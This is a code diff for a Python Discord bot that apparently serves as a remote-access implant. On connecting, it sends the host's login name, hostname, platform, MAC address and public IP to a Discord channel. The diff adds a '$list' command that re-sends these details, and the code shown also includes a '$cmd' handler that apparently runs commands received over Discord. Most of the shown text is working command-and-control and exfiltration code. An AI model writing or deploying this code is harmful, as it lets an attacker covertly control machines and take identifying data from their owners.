@@ -14,19 +14,29 @@ client = discord.Client(intents=intents)
 @client.event
 async def on_ready():
     print(f'We have logged in as {client.user}')
-    channel = client.get_channel(settings.channel)
     ip = get('https://api.ipify.org').content.decode('utf8')
-    await channel.send('Connected!\n```' + 
+    channel = client.get_channel(settings.channel)
+    await channel.send('**Connected!**\n```' +
+                       os.getlogin() + ' | ' + platform.node() + '\n' +
                        'platform: ' + platform.platform() + '\n' +
                        'MAC: ' + str(getnode()) + '\n' +
                        'IP: ' + ip + '\n' +
                        '```'
-                       )
+    )
 
 @client.event
 async def on_message(message):
     if message.author == client.user:
         return
+
+    if message.content.startswith('$list'):
+        ip = get('https://api.ipify.org').content.decode('utf8')
+        await message.channel.send(os.getlogin() + ' | ' + platform.node() + '\n```' + 
+                           'platform: ' + platform.platform() + '\n' +
+                           'MAC: ' + str(getnode()) + '\n' +
+                           'IP: ' + ip + '\n' +
+                           '```'
+        )
 
     if message.content.startswith('$cmd'):
         msg = message.content.split()
